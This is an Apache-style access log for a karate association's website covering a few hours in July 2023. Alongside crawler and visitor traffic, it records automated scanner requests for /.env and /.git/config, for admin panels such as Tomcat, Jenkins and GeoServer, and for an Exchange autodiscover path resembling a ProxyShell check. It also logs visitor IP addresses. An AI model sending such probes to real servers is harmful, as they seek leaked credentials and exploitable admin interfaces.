::ffff:95.108.213.239 - - [22/Jul/2023:00:02:27 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:95.108.213.249 - - [22/Jul/2023:00:02:28 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; YandexFavicons/1.0; +http://yandex.com/bots)"
::ffff:43.155.118.219 - - [22/Jul/2023:00:05:35 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:128.1.248.42 - - [22/Jul/2023:00:05:36 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:66.249.66.12 - - [22/Jul/2023:00:09:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.92.161 - - [22/Jul/2023:00:09:36 +0000] "GET /.well-known/apple-app-site-association HTTP/1.1" 404 177 "-" "AdsBot-Google (+http://www.google.com/adsbot.html)"
::ffff:162.216.150.11 - - [22/Jul/2023:00:14:50 +0000] "GET / HTTP/1.1" 200 57490 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:66.249.92.12 - - [22/Jul/2023:00:25:32 +0000] "GET /apple-app-site-association HTTP/1.1" 404 165 "-" "AdsBot-Google (+http://www.google.com/adsbot.html)"
::ffff:107.170.236.29 - - [22/Jul/2023:00:35:11 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:68.183.226.146 - - [22/Jul/2023:00:38:20 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:135.125.217.54 - - [22/Jul/2023:00:40:37 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Jul/2023:00:40:37 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:167.172.89.200 - - [22/Jul/2023:00:45:02 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:141.95.74.78 - - [22/Jul/2023:00:50:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.95.74.78 - - [22/Jul/2023:00:50:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:192.241.216.41 - - [22/Jul/2023:00:54:24 +0000] "GET /manager/text/list HTTP/1.1" 404 156 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:45.55.0.39 - - [22/Jul/2023:01:15:48 +0000] "GET /hudson HTTP/1.1" 404 145 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:92.118.39.83 - - [22/Jul/2023:01:23:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:92.118.39.83 - - [22/Jul/2023:01:23:04 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:74.82.47.2 - - [22/Jul/2023:01:25:21 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78"
::ffff:107.170.228.41 - - [22/Jul/2023:01:36:37 +0000] "GET /druid/index.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:43.155.118.219 - - [22/Jul/2023:01:39:44 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:128.1.248.42 - - [22/Jul/2023:01:52:57 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:198.199.104.48 - - [22/Jul/2023:02:04:48 +0000] "GET /ReportServer HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:193.70.81.103 - - [22/Jul/2023:02:05:34 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:193.70.81.103 - - [22/Jul/2023:02:05:37 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
::ffff:135.125.217.54 - - [22/Jul/2023:02:06:41 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Jul/2023:02:06:41 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.134.152 - - [22/Jul/2023:02:19:56 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:141.95.74.78 - - [22/Jul/2023:02:32:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:141.95.74.78 - - [22/Jul/2023:02:32:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:162.142.125.224 - - [22/Jul/2023:02:34:29 +0000] "GET / HTTP/1.1" 200 57490 "-" "-"
::ffff:54.212.63.125 - - [22/Jul/2023:02:39:30 +0000] "GET /.well-known/acme-challenge/uxyiXS6JvrTfzXXQLLQq78_I5fIujuXMyJP3daBlVuM HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:18.216.218.96 - - [22/Jul/2023:02:39:30 +0000] "GET /.well-known/acme-challenge/uxyiXS6JvrTfzXXQLLQq78_I5fIujuXMyJP3daBlVuM HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.103 - - [22/Jul/2023:02:39:31 +0000] "GET /.well-known/acme-challenge/uxyiXS6JvrTfzXXQLLQq78_I5fIujuXMyJP3daBlVuM HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.103 - - [22/Jul/2023:02:39:37 +0000] "GET /.well-known/acme-challenge/7SHkgayGOn9nC5QKcyg_sKzNxFpHFkP3xFqEgvjHWM8 HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:107.170.252.63 - - [22/Jul/2023:02:40:49 +0000] "GET /ReportServer HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:162.243.136.67 - - [22/Jul/2023:02:44:34 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 169 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:167.94.138.33 - - [22/Jul/2023:02:54:53 +0000] "GET / HTTP/1.1" 200 57490 "-" "-"
::ffff:167.94.138.33 - - [22/Jul/2023:02:54:53 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.33 - - [22/Jul/2023:02:54:54 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.138.33 - - [22/Jul/2023:02:54:54 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.33 - - [22/Jul/2023:02:54:54 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:185.142.236.34 - - [22/Jul/2023:02:55:30 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:185.142.236.34 - - [22/Jul/2023:02:55:31 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "-"
::ffff:185.142.236.34 - - [22/Jul/2023:02:55:32 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "-"
::ffff:185.142.236.34 - - [22/Jul/2023:02:55:32 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 163 "-" "-"
::ffff:185.142.236.34 - - [22/Jul/2023:02:55:33 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
::ffff:185.254.196.173 - - [22/Jul/2023:02:58:42 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [22/Jul/2023:02:58:43 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:64.207.177.82 - - [22/Jul/2023:03:05:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:64.207.177.82 - - [22/Jul/2023:03:05:55 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:162.216.149.88 - - [22/Jul/2023:03:09:21 +0000] "GET / HTTP/1.1" 200 57490 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:205.210.31.128 - - [22/Jul/2023:03:10:26 +0000] "GET / HTTP/1.1" 200 57490 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:167.99.189.205 - - [22/Jul/2023:03:13:22 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:167.99.189.205 - - [22/Jul/2023:03:13:22 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [22/Jul/2023:03:13:55 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:90.151.171.108 - - [22/Jul/2023:03:25:29 +0000] "GET http://checkip.amazonaws.com?Z74101334850Q1 HTTP/1.1" 200 57490 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
::ffff:135.125.217.54 - - [22/Jul/2023:03:47:51 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [22/Jul/2023:03:47:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:31.43.245.106 - - [22/Jul/2023:03:57:45 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:40.88.21.235 - - [22/Jul/2023:04:00:01 +0000] "GET / HTTP/1.1" 200 57490 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:40.88.21.235 - - [22/Jul/2023:04:00:01 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:66.249.66.201 - - [22/Jul/2023:04:00:36 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.66.161 - - [22/Jul/2023:04:01:33 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 200 691794 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.254.196.173 - - [22/Jul/2023:04:10:55 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [22/Jul/2023:04:10:56 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:26 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:27 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:27 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:27 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:27 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:27 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:28 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:28 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:28 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:28 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:28 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:28 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:29 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:29 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:29 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:29 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:29 +0000] "GET /images/favicon.ico HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:33 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:115.164.62.104 - - [22/Jul/2023:04:17:36 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:154.72.194.121 - - [22/Jul/2023:04:22:02 +0000] "GET /script HTTP/1.1" 404 145 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
::ffff:154.72.194.121 - - [22/Jul/2023:04:22:03 +0000] "GET /login HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
::ffff:154.72.194.121 - - [22/Jul/2023:04:22:04 +0000] "GET /jenkins/login HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
::ffff:154.72.194.121 - 8hYTSUFk [22/Jul/2023:04:22:06 +0000] "GET /manager/html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
::ffff:154.72.194.121 - - [22/Jul/2023:04:22:07 +0000] "GET /users/sign_in HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
::ffff:51.159.164.227 - - [22/Jul/2023:04:30:14 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:51.159.164.227 - - [22/Jul/2023:04:30:15 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:185.180.143.6 - - [22/Jul/2023:04:41:31 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:184.105.247.196 - - [22/Jul/2023:04:45:16 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:40.88.21.235 - - [22/Jul/2023:04:46:39 +0000] "GET / HTTP/1.1" 200 57490 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:40.88.21.235 - - [22/Jul/2023:04:46:39 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:184.105.247.196 - - [22/Jul/2023:04:47:10 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
::ffff:43.155.118.219 - - [22/Jul/2023:04:47:52 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:184.105.247.196 - - [22/Jul/2023:04:48:11 +0000] "GET /geoserver/web/ HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:24 +0000] "GET / HTTP/1.1" 200 57490 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:24 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
::ffff:172.59.160.157 - - [22/Jul/2023:05:00:25 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
